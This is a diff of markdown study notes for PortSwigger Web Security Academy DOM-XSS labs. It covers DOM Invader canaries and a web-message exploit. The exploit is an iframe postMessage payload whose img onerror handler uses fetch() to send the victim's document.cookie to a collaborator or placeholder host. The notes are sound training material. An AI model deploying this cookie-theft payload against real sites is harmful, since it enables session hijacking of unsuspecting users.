@@ -139,7 +139,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### Dom Invader  
 
->Using Dom Invader plug-in and set the canary to value, such as 'domxss' and detect DOM-XSS sinks that can be exploit.  
+>Using Dom Invader plug-in and set the canary to value, such as ```domxss``` and detect DOM-XSS sinks that can be exploit.  
 
 ![DOM Invader](images/dom-invader.png)  
 
@@ -233,11 +233,12 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 >In the source code we ***identify*** the call using ```addEventListener``` and element id ```ads``` reference.  
 
-[source-code-web-message-ads](images/source-code-web-message-ads.png)  
+![Source code web message ads](images/source-code-web-message-ads.png)  
 
->
+>The ```fetch``` function enclose the collaborator target inside back ticks, and when the iframe loads on the victim browser, the postMessage() method sends a web message to their home page.  
+
 ```html
-<iframe src="https://0ac5000103ef616dc349ce5000db0095.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://48abb8ntftpoxmevknc69pxuul0do3cs.oastify.com?collector=`+btoa(document.cookie))>','*')">
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://COLLABORATOR.com?collector=`+btoa(document.cookie))>','*')">
 ```  
 
 >Replacing the Burp Lab payload ```print()``` with ```fetch()``` to steal the victim session cookie.  
